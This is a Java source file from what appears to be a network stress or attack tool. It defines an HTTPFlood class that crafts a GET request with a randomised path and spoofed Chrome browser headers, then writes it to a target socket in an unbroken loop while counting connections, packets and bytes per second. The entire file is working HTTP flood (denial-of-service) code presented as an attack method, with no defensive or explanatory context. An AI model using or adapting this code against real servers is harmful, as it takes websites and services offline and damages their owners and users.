package ir.xenoncommunity.jss.methods.impl;

import ir.xenoncommunity.jss.utils.AttackStatics;
import ir.xenoncommunity.jss.methods.IAttackMethod;
import ir.xenoncommunity.jss.utils.Randomize;
import ir.xenoncommunity.jss.utils.SocketUtils;
import lombok.Cleanup;
import lombok.RequiredArgsConstructor;
import lombok.val;
import org.jetbrains.annotations.NotNull;

import java.net.InetAddress;
import java.net.Socket;
import java.net.StandardSocketOptions;
import java.nio.charset.StandardCharsets;

@RequiredArgsConstructor
public class HTTPFlood implements IAttackMethod {
    private final AttackStatics statics;

    /**
     * Creates an HTTP request with the specified address.
     *
     * @param addr the InetAddress to connect to
     * @return the byte array representation of the HTTP request
     */
    private static byte[] createHTTPRequest(final @NotNull InetAddress addr) {
        // Construct the HTTP request
        val request = "GET /" + Randomize.randomString(8) + " HTTP/1.1\r\n" +
                "Host: " + addr.getHostAddress() + "\r\n" +
                "Connection: keep-alive\r\n" +
                "Cache-Control: max-age=0\r\n" +
                "Pragma: no-cache\r\n" +
                "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 " +
                "(KHTML, like Gecko) Chrome/89.0.142.86 Safari/537.36\r\n" +
                "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp," +
                "image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\n" +
                "Sec-Fetch-Site: none\r\n" +
                "Sec-Fetch-Mode: navigate\r\n" +
                "Sec-Fetch-User: ?1\r\n" +
                "Sec-Fetch-Dest: document\r\n" +
                "Accept-Encoding: gzip, deflate, br\r\n" +
                "Accept-Language: en-US,en;q=0.9\r\n\r\n";

        // Encode the request to byte array using UTF-8 encoding
        return request.getBytes(StandardCharsets.UTF_8);
    }

    /**
     * Sends data to the specified address and port.
     *
     * @param addr the destination InetAddress
     * @param port the destination port number
     * @throws Exception if an error occurs during the sending process
     */
    @Override
    public void send(final InetAddress addr, final int port) throws Exception {
        // Check if the limit is reached before sending
        if (statics.isLimitReached()) return;

        // create a socket connection to the specified address and port
        @Cleanup val socket = new Socket(addr, port);

        // if the socket is not connected, return
        if (!socket.isConnected()) return;

        // enable socket options
        SocketUtils.enableSocketOpts(socket,
                StandardSocketOptions.TCP_NODELAY,
                StandardSocketOptions.SO_KEEPALIVE);
        // set socket timeout
        SocketUtils.setSoTimeout(socket, 1000);

        statics.cps(); // update connection per second statistics

        // get the output stream from the socket
        @Cleanup val outputStream = socket.getOutputStream();

        // create an HTTP request
        val bytes = createHTTPRequest(addr);
        val length = bytes.length;

        // send the request while the socket is connected and the limit is not reached
        while (socket.isConnected() && !statics.isLimitReached() && statics.isRunning()) {
            statics.bps(length); // update bytes per second statistics
            statics.pps(); // update packets per second statistics
            outputStream.write(bytes);
        }
    }
}
